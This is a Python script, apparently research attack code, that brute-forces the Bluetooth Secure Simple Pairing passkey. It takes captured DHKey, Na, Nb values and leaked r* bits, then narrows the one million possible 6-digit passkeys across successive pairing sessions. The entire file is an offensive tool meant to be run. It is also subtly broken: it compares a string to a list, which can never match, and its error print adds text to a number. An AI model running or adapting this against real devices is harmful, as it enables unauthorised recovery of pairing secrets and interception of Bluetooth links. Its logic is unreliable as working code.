"""This is a realtime working of the brute-force attack on the SM passkey entry protocol. The user needs to
input DHKey,Na0 and Nb0 values for every SSP session and the obtained r*. The attack displays the list of potential passkeys based
on the known r* bits."""

import hashlib
import hmac
import time

start_time = time.time()
"""Datasets sample 
DHkey = "2c31a47b5779809ef44cb5eaaf5c3e43d5f8faad4a8794cb987e9b03745c78dd"
Na = "356e369e521b0c3b99223ea4ce393024"
Nb = "3057b5f403616cfa4924ab9e8db98516"
"""
tmp = 0
count = 0


def firstbrute(dhkey, na, nb, passwords):
    # initialising the values obtained in first SSP session with device A.
    dhkey_bin = str(bin(int(dhkey, 16)))
    na_bin = str(bin(int(na, 16)))
    nb_bin = str(bin(int(nb, 16)))
    print("DHKEY: " + str(dhkey))
    print("na: " + str(na))
    print("nb: " + str(nb))
    dhkey_bin = dhkey_bin[2:]
    na_bin = na_bin[2:]
    nb_bin = nb_bin[2:]
    na_bin = na_bin.zfill(128)
    nb_bin = nb_bin.zfill(128)
    dhkey_bin = dhkey_bin.zfill(256)
    r = input("Enter obtained r* bits: ")
    c = list(r)
    n = len(c)
    count = 0

    # Brute Force
    for i in range(0, 1000000):
        passbrute = str(i)
        if len(passbrute) < 6:
            passbrute = passbrute.zfill(6)
        passbrute = int(passbrute)
        pasb = str(bin(passbrute))
        msg_brute = bytes(na_bin + nb_bin + pasb[2:22], "utf-8")
        key_brute = bytes(dhkey_bin, "utf-8")
        hb = hmac.new(key_brute, msg_brute, hashlib.sha256)
        hexdat_brute = hb.hexdigest()
        cb = str(bin(int(hexdat_brute, 16)))
        cb = cb[2:]
        # comparing n1 bits of the r* and bruteforce combination r*
        if cb[:n] == c[:n]:
            try:
                passwords[count] = passbrute
            except:
                print("here" + count)
            count = count + 1
    passwords = passwords[:count]
    count = count - 1
    print("No. of Potential Passkeys: " + str(len(passwords)))
    return passwords, count


def conbrute(count, dhkey, na, nb, passwords):
    # Initialising the values obtained in the first SSP session with device B and all the following consecutive SSP
    # sessions performed.
    newcount = 0
    dhkey_bin = str(bin(int(dhkey, 16)))
    na_bin = str(bin(int(na, 16)))
    nb_bin = str(bin(int(nb, 16)))
    dhkey_bin = dhkey_bin[2:]
    na_bin = na_bin[2:]
    nb_bin = nb_bin[2:]
    na_bin = na_bin.zfill(128)
    nb_bin = nb_bin.zfill(128)
    dhkey_bin = dhkey_bin.zfill(256)
    r = input("Enter obtained r* bits: ")
    c = list(r)
    n = len(c)
    # Brute Force Consecutive ssp session
    for i in range(count):
        passbrute = str(passwords[i])
        if len(passbrute) < 6:
            passbrute = passbrute.zfill(6)
        passbrute = int(passbrute)
        pasb = str(bin(passbrute))
        msg_brute = bytes(na_bin + nb_bin + pasb[2:22], "utf-8")
        key_brute = bytes(dhkey_bin, "utf-8")
        hb = hmac.new(key_brute, msg_brute, hashlib.sha256)
        hexdat_brute = hb.hexdigest()
        cb = str(bin(int(hexdat_brute, 16)))
        cb = cb[2:]
        # comparing n bits of the r* and brute-force combination br*
        if cb[:n] == c[:n]:
            passwords[newcount] = passbrute
            newcount = newcount + 1
    return passwords, newcount


passwords = [0] * 1000000
# First Brute Force
dhkey = bytes(input("Enter DHkey: "), 'utf-8')
na = bytes(input("Enter Na: "), 'utf-8')
nb = bytes(input("Enter Nb: "), 'utf-8')
passwords, count = firstbrute(dhkey, na, nb, passwords)
passwords = passwords[:count]
tmp = 0.5

while count != 1:
    dhkey = bytes(input("Enter DHkey: "), 'utf-8')
    na = bytes(input("Enter Na: "), 'utf-8')
    nb = bytes(input("Enter Nb: "), 'utf-8')
    print("DHKEY: " + str(dhkey))
    print("na: " + str(na))
    print("nb: " + str(nb))
    passwords, count = conbrute(count, dhkey, na, nb, passwords)
    passwords = passwords[:count]
    tmp = tmp + 0.5
    if count == 0:
        print("DHKEY error: " + str(dhkey))
        print("na err: " + str(na))
        print("nb err: " + str(nb))
        break
    print("No. of Potential Passkeys: " + str(len(passwords)))

print("Potential passkey list: " + str(passwords))
print("--- %s seconds ---" % (time.time() - start_time))
